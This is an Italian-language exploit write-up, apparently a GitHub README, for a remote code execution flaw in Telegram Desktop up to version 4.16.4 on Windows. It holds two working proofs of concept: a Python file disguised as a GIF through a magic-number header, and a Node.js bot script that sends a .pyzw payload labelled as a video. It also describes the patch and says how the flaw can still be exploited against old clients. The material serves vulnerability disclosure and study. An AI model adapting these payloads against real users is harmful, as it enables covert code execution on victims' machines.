# TELEGRAM DESKTOP RCE
## Setup della vittima
- **Telegram Desktop Version <= 4.16.4**
- **Python installato**
- **OS = Windows**

### WARNING: Questi PoC funzionano solo su Windows, altri sistemi operativi non sono stati testati.
La vulnerabilità si basa sul "typo" nello scrivere il nome dell'estensione "pyzw" nell'elenco delle estensioni pericolose.

![photo1713802375(1)](https://github.com/Raffo24/telegram-desktop-PoC/assets/46811658/1908a7dc-816b-47a9-9389-9915de4e2ea1)

## PoC 1 ==> file polyglot (image/gif)

File con del codice python ma che ha MIME “image/gif”
**exploit1.pyzw**
```
GIF89A = “test”
import os
os.system(“calc”)
```
Infatti **inserendo nell’header del file il magic number 47 49 46 38 37 61 (GIF89A)
è possibile creare un file che sembra una GIF ma che in realtà nasconde al suo interno un codice malevolo**.

![photo1713493979](https://github.com/Raffo24/telegram-desktop-PoC/assets/46811658/a8e72a18-55bb-401c-bfb9-a2c17799c98d)

L'hexdump:

![image_2024-04-19_04-04-03](https://github.com/Raffo24/telegram-desktop-PoC/assets/46811658/05e65e01-c8a7-43c7-a50d-d362773e44be)

Durante il caricamento il file viene considerato come una GIF da telegram desktop
tuttavia, nel momento di visualizzazione appare come una GIF non funzionante e viene visualizzato come un rettangolo nero.

Essendo considerata come una GIF da telegram desktop, quando il client prova ad aprirla, viene passato il controllo al sistema operativo; a quel punto Windows (basandoci sull’estensione e non sul MIME) la apre con python, permettendo di fatto RCE.

## PoC 2 ==> Telegram BOT API (video/mp4)
Codice che si vuole far eseguire alla vittima
**exploit2.pyzw**
```
__import__("subprocess").call(["calc.exe"])
```

Questa vulnerabilità sfrutta un altro concetto, le API di telegram hanno una funzione **SendVideo** che permette di inviare dei video tramite multipart/form-data e si è scoperto che **non ci sono controlli per verificare se viene effettivamente caricato un file di tipo video, dunque è possibile caricare dei file di qualunque estensione e di qualsiasi MIME come fossero dei video**.

![immagine](https://github.com/Raffo24/telegram-desktop-PoC/assets/46811658/1e02b04d-64c7-4f65-8d56-80026b492286)

Dato che il client si fida(va) ciecamente del server, il file verrà visualizzato come un video. 
<br>
Questo accade perchè il server di telegram memorizza i "metadati" inviati insieme alla request di video upload e poi il client di telegram desktop utilizza questi metadati per mostrare l'anteprima del video.


**SendVideoCall.js**
```
const fs = require("fs");
const TelegramBot = require("node-telegram-bot-api");

const token = "<BOT_TOKEN>";

const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/video/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendVideo(
    chatId,
    fs.readFileSync("exploit2.pyzw"),
    {
      width: 300,
      height: 300,
      duration: 30,
      // thumbnail: "https://duckduckgo.com/favicon.ico",
    }, {
      filename: "fakeVideo.pyzw",
      contentType: "video/mp4"
    }
  );
});
```

Tuttavia, nel momento di visualizzazione, appare come un video non funzionante e viene visualizzato come un rettangolo nero con il simbolo "play" al centro e la durata fake (specificata dall'attaccante nella sua API call nel parametro "duration").

<img width="545" alt="image_2024-04-22_19-59-25" src="https://github.com/Raffo24/telegram-desktop-PoC/assets/46811658/4286b7f6-e70e-470d-a661-d7f1fa5f9cbd">


Quando il client prova ad aprirlo (essendo considerato come un video da telegram desktop) viene passato il controllo al sistema operativo; a quel punto Windows (basandoci sull’estensione e non sul Content-Type) lo apre con python, permettendo di fatto RCE.

## WARNING: la vulnerabilità è stata patchata!
- **lato server**: aggiungendo l'estensione .untrusted ai file .pyzw (*.pyzw.untrusted)
- **lato client** (> 4.16.4) :
	* aggiungendo "pyzw" all'elenco delle estensioni pericolose
	* facendo in modo che non venga mostrata l'ateprima delle GIF e dei video non funzionanti 
	* aggiungendo un controllo per verificare che il MIME corrisponde al tipo di estensione inviata; se non corrisponde, il client aggiungerà l'estensione corrispondente al MIME/Content type, ad esempio:
		*  se viene inviato un file con MIME GIF verrà scaricato dal client con estensione corrispondente \*.pyzw.gif, 
		*  invece, se il file viene inviato dal BOT con ContentType "video/mp4" allora il file verrà scaricato sul client come \*.pyzw.mp4.
 	
<br>

![photo1713802375](https://github.com/Raffo24/telegram-desktop-PoC/assets/46811658/2ae70b62-e69b-424b-9649-ad347670e30d)


**È ancora possibile sfruttare la vulnerabilità** rielaborando uno degli exploit se: 
- il target ha ancora il client telegram desktop vecchio installato (<= 4.16.4);
- si conosce un programma installato nel computer della vittima in grado di eseguire delle azioni a seguito dell'apertura di un file (il file in questione deve avere un'estensione non presente nell'elenco delle estensioni pericolose).
